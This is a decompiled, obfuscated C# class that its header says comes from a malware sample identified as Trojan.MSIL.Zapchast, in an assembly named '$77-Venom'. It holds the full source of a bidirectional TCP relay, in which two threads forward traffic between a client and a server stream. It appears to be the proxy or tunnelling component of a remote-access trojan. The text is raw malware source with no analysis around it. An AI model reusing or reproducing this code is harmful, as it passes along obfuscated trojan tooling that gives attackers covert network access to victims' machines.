// Decompiled with JetBrains decompiler
// Type: 䲒祏ᮮ踱埤ᑉ琧멱﫣
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Net.Sockets;
using System.Threading;

internal class 䲒祏\uE14Aᮮ踱埤ᑉ琧멱\uFAE3
{
  private TcpClient 둴ږꓧ觐씩ᗭ\uFFFD\u2AE0\u0F2D箱뽿\uFBBE\u001Cﴯ胒䄕\u09B1\uEA05쏯\uFFFD;
  private TcpClient \u0869ꃴ醲\u32D4힌䀟띞悎䋏\uFFFD펽嫙䕜〧ﳭ\uED54\uEA4F䫁쾪\u02DB;
  private NetworkStream 籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집;
  private NetworkStream \u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076;
  private 㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uE2ABኸ绗\uF885\uEFFAꊻ奺\uF46F\u2086祘ᗄἥ鏱䫇뱰돪\uE476ℍ䝉\uE341 ꘑ䜆梵\uE684鬐喇ᢒ쵚雍ꂇ睩뤁밄縆銎嬠㐧哔곖\uF713;

  public void 䲽\u283F玩䊙\uE1A0ꒇ쓰껳\uFFFD䕅땩韢\uD7C9\u21D7붳薧눀ꅃ퀋朽(
    TcpClient client,
    NetworkStream client_str,
    TcpClient server,
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uE2ABኸ绗\uF885\uEFFAꊻ奺\uF46F\u2086祘ᗄἥ鏱䫇뱰돪\uE476ℍ䝉\uE341 notify)
  {
    this.둴ږꓧ觐씩ᗭ\uFFFD\u2AE0\u0F2D箱뽿\uFBBE\u001Cﴯ胒䄕\u09B1\uEA05쏯\uFFFD = client;
    this.\u0869ꃴ醲\u32D4힌䀟띞悎䋏\uFFFD펽嫙䕜〧ﳭ\uED54\uEA4F䫁쾪\u02DB = server;
    this.籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집 = client_str;
    this.\u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076 = server.GetStream();
    this.ꘑ䜆梵\uE684鬐喇ᢒ쵚雍ꂇ睩뤁밄縆銎嬠㐧哔곖\uF713 = notify;
    new Thread(new ThreadStart(this.䙦\u25BB\u2036\uE450ꅬ\u0B77챕尿兼腵럠溤鱯\uEBF4臡\u2AAE柟\uAA38蘇帗)).Start();
    new Thread(new ThreadStart(this.䉹\uFFFD䓃ꔥᡓ䑒ପ脠\u23E8飶䜾椙䌱\u0FC8\u2F79\uF811\u1AC7옐㾭䄦)).Start();
  }

  private void 䙦\u25BB\u2036\uE450ꅬ\u0B77챕尿兼腵럠溤鱯\uEBF4臡\u2AAE柟\uAA38蘇帗()
  {
    try
    {
      byte[] buffer = new byte[24577];
      while (㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.쉃曎鄖鯊ၺ雋먳鉢儲黗벟밿칤㖛ⱻ댴\u3385芢襝\uFFFD)
      {
        int count = this.籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집.Read(buffer, 0, buffer.Length);
        if (count == 0)
        {
          this.籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집.Close();
          this.둴ږꓧ觐씩ᗭ\uFFFD\u2AE0\u0F2D箱뽿\uFBBE\u001Cﴯ胒䄕\u09B1\uEA05쏯\uFFFD.Close();
          this.\u0869ꃴ醲\u32D4힌䀟띞悎䋏\uFFFD펽嫙䕜〧ﳭ\uED54\uEA4F䫁쾪\u02DB.Close();
          this.\u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076.Close();
          break;
        }
        this.\u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076.Write(buffer, 0, count);
        this.\u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076.Flush();
      }
    }
    catch (Exception ex)
    {
      this.둴ږꓧ觐씩ᗭ\uFFFD\u2AE0\u0F2D箱뽿\uFBBE\u001Cﴯ胒䄕\u09B1\uEA05쏯\uFFFD.Close();
      this.\u0869ꃴ醲\u32D4힌䀟띞悎䋏\uFFFD펽嫙䕜〧ﳭ\uED54\uEA4F䫁쾪\u02DB.Close();
    }
  }

  private void 䉹\uFFFD䓃ꔥᡓ䑒ପ脠\u23E8飶䜾椙䌱\u0FC8\u2F79\uF811\u1AC7옐㾭䄦()
  {
    try
    {
      byte[] buffer = new byte[24577];
      while (㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.쉃曎鄖鯊ၺ雋먳鉢儲黗벟밿칤㖛ⱻ댴\u3385芢襝\uFFFD)
      {
        int count = this.\u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076.Read(buffer, 0, buffer.Length);
        if (count == 0)
        {
          this.籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집.Close();
          this.둴ږꓧ觐씩ᗭ\uFFFD\u2AE0\u0F2D箱뽿\uFBBE\u001Cﴯ胒䄕\u09B1\uEA05쏯\uFFFD.Close();
          this.\u0869ꃴ醲\u32D4힌䀟띞悎䋏\uFFFD펽嫙䕜〧ﳭ\uED54\uEA4F䫁쾪\u02DB.Close();
          this.\u0B75ᙤ\uFBC5媘\uF32Aꂜ辒棑ꖠ\uFFFD迦䫝㲲霑㾼혉ᒌ\uEDC9种\uE076.Close();
          break;
        }
        this.籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집.Write(buffer, 0, count);
        this.籿摄쁊\uFFFD\uF207瘗\uE92E洂퇝粖漲ᠽ\u06FE渗萲\u0AFEﱦ繥켘집.Flush();
      }
    }
    catch (Exception ex)
    {
      this.둴ږꓧ觐씩ᗭ\uFFFD\u2AE0\u0F2D箱뽿\uFBBE\u001Cﴯ胒䄕\u09B1\uEA05쏯\uFFFD.Close();
      this.\u0869ꃴ醲\u32D4힌䀟띞悎䋏\uFFFD펽嫙䕜〧ﳭ\uED54\uEA4F䫁쾪\u02DB.Close();
    }
  }
}
